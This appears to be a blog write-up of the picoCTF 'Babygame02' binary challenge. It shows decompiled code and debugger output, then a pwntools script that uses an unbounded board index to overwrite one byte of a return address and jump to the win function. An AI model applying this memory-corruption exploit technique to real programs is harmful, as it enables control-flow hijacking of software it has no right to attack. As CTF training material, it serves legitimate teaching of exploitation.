---
title: "Babygame02"
date: "2025-12-14"
tags: ["picoCTF", "OOB"]
---

They give us a binary without its source code.

```c
file game
game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a78466abe166810914fe43e5bd71533071ad919e, for GNU/Linux 3.2.0, not stripped

pwndbg> checksec
File:     /home/ub1cu0/Escritorio/PWN/picoCTF/babygame02/game
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

As we can see it only has NX. Let's look at how it works:

```c
Player position: 4 4
End tile position: 29 89
...........................................................................................................................................................................................................................................................................................................................................................................@...........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
.......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................X
```

It is a game where we move around by typing 'w', 'a', 's' and 'd'. If we move our character (@) onto the X it prints "You Win!".

Let's decompile the code to look for hidden things. These are the things I found:

1. The board array, with everything inside it, is kept on the stack
2. If we type `l` followed by a symbol, it changes the player's ascii.

```c
void move_player(player *player,char input,tableroStruct *tablero)

{
  int iVar1;
  
  if (input == 'l') {
    iVar1 = getchar();
    player_tile = (char)iVar1;
  }
  if (input == 'p') {
    solve_round(tablero,player);
  }
  tablero->casillas[player->pos_X][player->pos_Y] = '.';
  if (input == 'w') {
    player->pos_X = player->pos_X + -1;
  }
  else if (input == 's') {
    player->pos_X = player->pos_X + 1;
  }
  else if (input == 'a') {
    player->pos_Y = player->pos_Y + -1;
  }
  else if (input == 'd') {
    player->pos_Y = player->pos_Y + 1;
  }
  tablero->casillas[player->pos_X][player->pos_Y] = player_tile;
  return;
}
```

3. There is no negative or positive limit on where the player can be

Thanks to this we know we have a 1 byte arbitrary write. The l option picks what to write and the OOB picks where. What can we overwrite? We can try to overwrite the return address. But where do we want to jump? I found this win function:

```c
void win(void)

{
  char local_4c [60];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("flag.txt not found in current directory");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_4c,0x3c,local_10);
  printf(local_4c);
  return;
}
```

If we look at the function addresses and at the stack, we can see the following:

```c
0x0804975d    3    131 sym.wins
```

```c
05:0014│-004   0xffffc4c4 —▸ 0xffffd05c —▸ 0xffffd1eb ◂— 'SHELL=/bin/bash'
06:0018│ ebp   0xffffc4c8 —▸ 0xffffcf88 ◂— 0
07:001c│+004   0xffffc4cc —▸ 0x8049709 (main+149) ◂— add esp, 0x1
```

We see that between the return address in the stack frame of the `move_player` function and the `win` address there is only 1 byte of difference:

```c
0x80497 09 y 0x080497 5d
```

So if we use the arbitrary write to touch that return address and change the last byte to the one of `win`, we would get the flag.

First let's work out the offset so we know where we have to put the player:

```c
 ebp   0xffffc4c8 —▸ 0xffffcf88 ◂— 0
+004   0xffffc4cc —▸ 0x8049709 (main+149) ◂— add esp, 0x10
+008   0xffffc4d0 —▸ 0xffffc4e8 ◂— 4
+00c   0xffffc4d4 ◂— 0x64 /* 'd' */
+010   0xffffc4d8 —▸ 0xffffc4f3 ◂— 0x2e2e2e2e ('....')
```

The telescope gives us everything we need. Thanks to that we know that:

1. The board starts at address `0xffffc4f3`
2. We want to modify the content at address `0xffffc4cc`

So, assuming our player is at position 0,0:

```c
pwndbg> x 0xffffc4f3 - 0xffffc4cc
0x27:   Cannot access memory at address 0x27
```

We have to move the player 0x27 (39) bytes into the negatives to reach the byte we want.

We can write the exploit now:

```python
from pwn import *

exe = './game'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

io.recvline(b'X\n')
io.sendline(b'aaaa')

io.recvline(b'X\n')
io.sendline(b'wwww')

# Lo anterior es para poner al player en la posición 0,0.

io.recvline(b'X\n')
io.sendline(b'l]') # ] en ascii es 0x5d en hex. El cual es el ultimo byte de win

io.recvline(b'X\n')
io.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # 39 'a's


io.interactive()
```

However, even though it all looks right, it is not going to work. That happens because on the way we are trashing something important and we eat a Segmentation Fault:

```c
Program received signal SIGSEGV, Segmentation fault.
0x080494ca in move_player ()
```

To fix this we can add one more 'w' and then an 's' to dodge the corrupted byte on the way that breaks the program. (I got this from a writeup because I did not come up with it) https://blog.ry4n.org/babygame02-picoctf-writeup-6bf57b54f7b3

With this change we can see the flag:

```
..........................................................................................
..........................................................................................
.........................................................................................X
FLAG
```

## Warning

It will not work remotely. That is fixed by making the program jump a little further than the win function, for example to one of these:

```nasm
			0x0804975d      55             push ebp
│           0x0804975e      89e5           mov ebp, esp
│           0x08049760      53             push ebx
│           0x08049761      83ec44         sub esp, 0x44
│           0x08049764      e8d7f9ffff     call sym.__x86.get_pc_thunk.bx
│           0x08049769      81c397280000   add ebx, 0x2897
│           0x0804976f      90             nop
│           0x08049770      90             nop
│           0x08049771      90             nop
│           0x08049772      90             nop
│           0x08049773      90             nop
│           0x08049774      90             nop
│           0x08049775      90             nop
│           0x08049776      90             nop
│           0x08049777      90             nop
│           0x08049778      90             nop
│           0x08049779      83ec08         sub esp, 8
│           0x0804977c      8d8348e0ffff   lea eax, [ebx - 0x1fb8]
```

In this case, the only one I have tried that works is `0x08049760`